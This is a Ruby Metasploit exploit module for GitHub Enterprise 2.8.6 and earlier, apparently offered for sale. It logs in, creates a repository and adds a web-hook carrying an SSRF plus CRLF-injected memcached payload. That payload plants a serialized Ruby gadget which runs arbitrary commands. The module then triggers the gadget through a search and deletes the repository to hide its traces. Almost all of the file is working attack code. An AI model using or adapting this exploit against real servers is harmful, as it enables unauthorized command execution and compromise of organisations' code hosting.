##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
# Stubs, since we don't want to execute the code locally.
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'GitHub Enterprise Web-hook RCE',
                      'Description' => %q{
    This module exploits an authenticated remote code exection
    vulnerability in versions 2.8.6 and prior of GitHub Enterprise.

    Due to a number if chainable vulnerabilities in version 2.8.6 and prior
    of GitHub Enterprise, an authenticated attacker with the ability to create
    a repository can execute commands on the server as an unprivileged user.

    Categories: Open Source, Enterprise

    Price: 7

    Video: https://asciinema.org/a/f78JuN3iEFinDU4mblQDyzUcD

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework
    },
      'Author' =>
    [
    ],
    'License' => 'VolatileMinds',
    'References' =>
    [
    ],
    'Privileged' => false,
    'Platform'   => ['unix', 'linux'],
    'Arch'       => ARCH_CMD,
    'Payload'    =>
    {
      #'Space' => 1024
    },
    'Targets' =>
    [
      [ 'Automatic', { } ],
    ],
    'DefaultTarget'  => 0,
    'DisclosureDate' => ''))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Github directory path", '/']),
        OptString.new('USERNAME', [true, 'Github username', 'username']),
        OptString.new('PASSWORD', [true, 'Github password', 'password']),
      ], self.class)
  end

  def exploit

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login'),
    })

    cookie = res.get_cookies

    auth_token = $1 if res.body =~ /<input name="authenticity_token" type="hidden" value="(.*?)" \/>/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'session'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
      'commit' => 'Sign in',
      'utf8' => "\xe3\x9c\x93",
      'authenticity_token' => auth_token,
      'login' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    }
    })

    if res.code == 200
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    cookie = res.get_cookies

    repo_name = Rex::Text.rand_text_alpha(8)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'new'),
      'cookie' => cookie
    })

    auth_token = $1 if res.body =~ /<input name="authenticity_token" type="hidden" value="(.*?)" \/>/

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'repositories'),
      'vars_post' => {
      'utf8' => "\xe2\x9c\x93",
      'authenticity_token' => auth_token,
      'owner' => datastore['USERNAME'],
      'repository[name]' => repo_name,
      'repository[description]' => '',
      'repository[public]' => true,
      'repository[auto_init]' =>  0
    },
    'cookie' => cookie
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/#{datastore['USERNAME']}/#{repo_name}/settings/hooks/new"),
      'cookie' => cookie
    })

    auth_token = $1 if res.body =~ /<input name="authenticity_token" type="hidden" value="(.*?)" \/>/

    slen = (7+payload.encoded.length).to_s(16)
    working_url = "http://0:8000/composer/send_email?to=fdsa@fdsa.com&url="+CGI.escape("http://127.0.0.1:11211/\x0D\x0Aset\x20githubproductionsearch/queries/code_query\x3A857be82362ba02525cef496458ffb09cf30f6256\x3Av3\x3Acount\x200\x2060\x20#{127+payload.encoded.length}\x0D\x0A\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy\x07\x3A\x0E\x40instanceo\x3A\x08ERB\x07\x3A\x09\x40srcI\x22#{[slen].pack("H*")}\x60#{payload.encoded}\x60\x06\x3A\x06ET\x3A\x0C\x40linenoi\x00\x3A\x0C\x40method\x3A\x0Bresult\x0D\x0A\x0D\x0A")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/#{datastore['USERNAME']}/#{repo_name}/settings/hooks"),
      'method' => 'POST',
      'cookie' => cookie,
      'data' => "utf8=%e2%9c%93&authenticity_token=#{CGI.escape(auth_token)}&hook%5burl%5d=#{CGI.escape(working_url)}&hook%5bcontent_type%5d=json&hook%5bsecret%5d=&hook%5binsecure_ssl%5d=0&subscription-choice=push&hook%5bevents%5d%5b%5d=push&hook%5bactive%5d=1"
    })

    sleep(3) #the longer, the more reliable
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'search'),
      'headers' => {
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5'
    },
    'vars_get' => {
      'q' => 'ggggg', #Rex::Text.rand_text_alpha(8),
      'type' => 'Repositories',
    },
    'cookie' => cookie
    }, 1)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, datastore['USERNAME'], repo_name, 'settings'),
      'cookie' => cookie
    })

    auth_token = $1 if res.body =~ /<input name="authenticity_token" type="hidden" value="(.*?)" \/>/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, datastore['USERNAME'], repo_name, 'settings', 'delete'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
      'utf8' => "\xe2\x9c\x93",
      '_method' => 'delete',
      'authenticity_token' => auth_token,
      'verify' => datastore['USERNAME'] + "/" + repo_name
    }
    })

  end

end
